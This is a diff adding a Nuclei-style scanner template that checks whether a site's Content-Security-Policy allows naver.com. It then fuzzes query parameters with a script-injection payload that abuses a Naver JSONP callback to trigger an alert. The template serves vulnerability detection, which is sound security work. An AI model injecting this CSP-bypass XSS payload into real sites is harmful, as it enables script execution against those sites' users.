@@ -1,0 +1,55 @@
+id: naver-like-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Naver Like
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,naver-like,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "naver.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: naver_like_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://common.like.naver.com/v1/search/contents?callback=alert&q=x"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "naver_like_csp_xss == true"
+# digest: 490a0046304402204a82fde51da26440d3cdb0dc15be60174d5628bbd1a034bb1be7e7579a9f3174022076fe69b23558fa77cc585447bb424ecc97ab296758457d630dfd71a06fbd6762:922c64590222798bb761d5b6d8e72950
